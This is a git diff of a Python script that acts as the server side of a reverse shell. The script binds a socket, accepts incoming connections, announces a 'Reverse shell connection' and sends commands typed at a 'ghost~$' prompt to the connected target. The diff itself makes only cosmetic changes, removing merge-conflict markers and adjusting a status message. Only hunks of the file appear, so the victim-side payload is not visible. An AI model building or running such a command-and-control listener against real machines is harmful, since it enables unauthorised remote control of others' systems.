@@ -1,10 +1,6 @@
 import sys
 import socket
 
-<<<<<<< HEAD
-=======
-
->>>>>>> 7dccb935c0b9a82a4932fb0ba2b4b37d113984ac
 host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0' #server IP
 port = int(sys.argv[2] if len (sys.argv) > 2 else 5555) # port we're tunneling data into
 
@@ -18,9 +14,10 @@ server.listen(5)
 while True:
 	print('Listening on', host, ':', port)
 	client = server.accept() #accept the successful connection
-	print(f'[*] Connection opened {client[1]}')
+	print(f'[STATUS] Connection opened {client[1]}')
 	client[0].send('Reverse shell connection.'.encode())
 	while True:
+
 		cmd = input('ghost~$ ')
 		client[0].send(cmd.encode()) #send command to target
 
@@ -39,3 +36,4 @@ while True:
 		break
 
 server.close()
+# https://pymotw.com/2/threading/
